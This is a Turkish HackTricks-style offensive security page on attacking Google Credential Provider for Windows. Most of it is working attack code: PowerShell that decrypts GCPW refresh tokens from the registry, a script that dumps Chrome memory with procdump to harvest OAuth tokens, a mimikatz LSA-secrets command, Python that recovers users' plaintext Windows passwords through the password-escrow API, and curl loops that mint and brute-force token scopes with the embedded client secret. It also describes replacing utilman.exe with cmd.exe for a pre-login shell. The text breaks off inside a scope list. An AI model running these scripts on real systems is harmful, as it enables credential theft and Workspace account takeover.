# GWS - Workspace Senkronizasyon Saldırıları (GCPW, GCDS, AD & EntraID ile Dizin Senkronizasyonu)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Ekip Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Ekip Uzmanı (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## GCPW - Windows için Google Kimlik Sağlayıcısı

Bu, kullanıcıların **Workspace kimlik bilgilerini** kullanarak Windows PC'lerine giriş yapabilmeleri için Google Workspaces'ın sağladığı tek oturum açma sistemidir. Ayrıca, bu, PC'deki bazı yerlerde Google Workspace'e erişim için token'ları saklayacaktır.

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) 'in **GCPW**'yi tespit edebildiğini, yapılandırma hakkında bilgi alabileceğini ve **hatta token'ları** alabileceğini unutmayın.
{% endhint %}

### GCPW - MitM

Bir kullanıcı, GCPW aracılığıyla Google Workspace ile senkronize edilmiş bir Windows PC'ye eriştiğinde, yaygın bir giriş formunu doldurması gerekecektir. Bu giriş formu, PC'nin bir istekle yenileme token'ı için değiştireceği bir OAuth kodu döndürecektir:

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

Yeni satırlar okunabilirliği artırmak için eklenmiştir.

{% hint style="info" %}
Bir MitM gerçekleştirmek, PC'ye `Proxifier` yükleyerek, `utilman.exe` ikilisini `cmd.exe` ile değiştirerek ve Windows giriş sayfasında **erişilebilirlik özelliklerini** çalıştırarak mümkündür. Bu, **CMD**'yi çalıştıracak ve **Proxifier'ı başlatıp yapılandırmanızı** sağlayacaktır.\
`Proxifier`'da HIZLI UDP trafiğini **engellemeyi** unutmayın, böylece TCP iletişimine düşer ve görebilirsiniz.

Ayrıca "Hizmetler ve diğer kullanıcılar" bölümünde her iki seçeneği de yapılandırın ve Windows'a Burp CA sertifikasını yükleyin.
{% endhint %}

Ayrıca **`HKLM:\SOFTWARE\Google\GCPW`** anahtarına `enable_verbose_logging = 1` ve `log_file_path = C:\Public\gcpw.log` anahtarlarını ekleyerek bazı günlüklerin saklanması sağlanabilir.

### GCPW - Parmak İzi

GCPW'nin bir cihazda kurulu olup olmadığını kontrol etmek için aşağıdaki işlemin var olup olmadığını veya aşağıdaki kayıt defteri anahtarlarının var olup olmadığını kontrol etmek mümkündür:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
In **`HKCU:\SOFTWARE\Google\Accounts`** kullanıcı e-posta adresine ve kullanıcının yakın zamanda giriş yapması durumunda şifrelenmiş **refresh token**'a erişmek mümkündür.

In **`HKLM:\SOFTWARE\Google\GCPW\Users`** `domains_allowed` anahtarında giriş yapmasına izin verilen **domainler** bulunabilir ve alt anahtarlarda kullanıcıya ait e-posta, resim, kullanıcı adı, token ömrü, token tutamağı gibi bilgilere ulaşmak mümkündür.

{% hint style="info" %}
Token tutamağı, `eth.` ile başlayan ve bir istek ile bazı bilgilerin çıkarılabileceği bir token'dır:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

Ayrıca, bir erişim jetonunun token handle'ını şu şekilde bir istekle bulmak mümkündür:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

Bildiğim kadarıyla, token handle'dan bir refresh token veya access token almak mümkün değil.
{% endhint %}

Ayrıca, dosya **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** farklı **ayarlar** hakkında bilgileri içeren bir json'dur; örneğin `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (eğer Workspace'ten birkaç kullanıcı bilgisayara giriş yapabiliyorsa) ve `validityPeriodDays` (bir kullanıcının Google ile doğrudan yeniden kimlik doğrulaması yapmasına gerek olmadığı gün sayısı).

### GCPW - Kayıt Defteri Yenileme Token'ları

Kayıt defteri **`HKCU:\SOFTWARE\Google\Accounts`** içinde, içinde **`refresh_token`** şifrelenmiş bazı hesaplar bulmak mümkün olabilir. **`ProtectedData.Unprotect`** yöntemi bunu kolayca çözebilir.

<details>

<summary><strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> verilerini al ve refresh_tokens'ı çöz</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Örnek çıkış:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

[**Bu videoda**](https://www.youtube.com/watch?v=FEQxHRRP\_5I) açıklandığı gibi, eğer kayıt defterinde token bulamazsanız, **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** değerini değiştirmek (veya silmek) mümkündür ve kullanıcı bilgisayara eriştiğinde tekrar giriş yapması gerekecek ve **token önceki kayıt defterinde saklanacaktır**.

### GCPW - Disk Yenileme Tokenleri

Dosya **`%LocalAppData%\Google\Chrome\User Data\Local State`** kullanıcının **Google Chrome profillerinde** bulunan **`refresh_tokens`** şifresini çözmek için anahtarı saklar:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Bu tokenlere şifrelenmemiş şekilde erişen bazı **C# kodlarını** [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) içinde bulmak mümkündür.

Ayrıca, şifreleme bu kodda bulunabilir: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

AESGCM'nin kullanıldığı gözlemlenebilir, şifrelenmiş token bir **sürüm** ile başlar (**`v10`** şu anda), ardından [**12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42) gelir ve ardından **şifreli metin** ile son bir **16B mac** bulunur.

### GCPW - Süreç Belleğinden Token Dökümü

Aşağıdaki script, `procdump` kullanarak her **Chrome** sürecini **dökme** için kullanılabilir, **stringleri** çıkartır ve ardından **erişim ve yenileme tokenleri** ile ilgili stringleri **arama** yapar. Eğer Chrome bir Google sitesine bağlıysa, bazı **süreçler bellek içinde yenileme ve/veya erişim tokenlerini saklıyor olacaktır!**

<details>

<summary>Chrome süreçlerini dök ve tokenleri ara</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

`gcpw_extension.exe` ile aynı şeyi denedim ama herhangi bir token bulamadı.

Bir sebepten dolayı, **bazı çıkarılan erişim token'ları geçerli olmayacak (bazıları geçerli olsa da)**. Dump'tan geçerli token'ı elde etmek için karakterleri 1'er 1'er kaldırmak amacıyla aşağıdaki scripti denedim. Geçerli bir token bulmama asla yardımcı olmadı, ama belki yardımcı olabilir diye düşünüyorum:

<details>

<summary>Karakterleri 1'er 1'er kaldırarak erişim token'ını kontrol et</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - Düz metin şifresini geri kazanma

GCPW'yi kullanarak şifrenin düz metnini geri kazanmak için **mimikatz** kullanarak **LSASS**'dan şifrelenmiş şifreyi dökmek mümkündür:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Sonra, resmi gibi `Chrome-GCPW-<sid>` şeklinde gizli anahtarı arayın:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Daha sonra, `https://www.google.com/accounts/OAuthLogin` kapsamına sahip bir **erişim belirteci** ile şifreyi şifrelemek için özel anahtarı talep etmek mümkündür:

<details>

<summary>Erişim belirteci, şifreli şifre ve kaynak kimliği verildiğinde şifreyi düz metin olarak elde etmek için script</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Bunun ana bileşenlerini Chromium kaynak kodunda bulmak mümkündür:

* API alanı: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API uç noktası: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - Yenileme jetonlarından erişim jetonları oluşturma

Yenileme jetonunu kullanarak, aşağıdaki komutta belirtilen istemci kimliği ve istemci sırrı ile erişim jetonları oluşturmak mümkündür:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Kapsamlar

{% hint style="info" %}
Bir refresh token'a sahip olsanız bile, erişim token'ı için herhangi bir kapsam talep etmek mümkün değildir çünkü yalnızca **erişim token'ını oluşturduğunuz uygulama tarafından desteklenen kapsamları talep edebilirsiniz**.

Ayrıca, refresh token her uygulamada geçerli değildir.
{% endhint %}

Varsayılan olarak GCPW, kullanıcı olarak her olası OAuth kapsamına erişime sahip olmayacaktır, bu nedenle aşağıdaki script'i kullanarak `refresh_token` ile bir `access_token` oluşturmak için kullanılabilecek kapsamları bulabiliriz:

<details>

<summary>Kapsamları brute-force etmek için Bash script'i</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anında aldığım çıktı şuydu:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
Ayrıca, Chromium kaynak kodunu kontrol ederek [**bu dosyayı bulmak mümkündür**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), bu dosya **daha önce zorla elde edilen listede** **görünmeyen diğer kapsamları** içermektedir. Bu nedenle, bu ek kapsamların varsayılması mümkündür:

<details>

<summary>Ek kapsamlar</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

En ilginç olanı muhtemelen şudur:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
Ancak, bu kapsamı gmail'e erişmek veya grupları listelemek için kullanmayı denedim ve işe yaramadı, bu yüzden hala ne kadar faydalı olduğunu bilmiyorum.

**Tüm bu kapsamlarla bir erişim belirteci alın**:

<details>

<summary>Tüm kapsamlarla refresh_token'dan erişim belirteci oluşturmak için Bash betiği</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
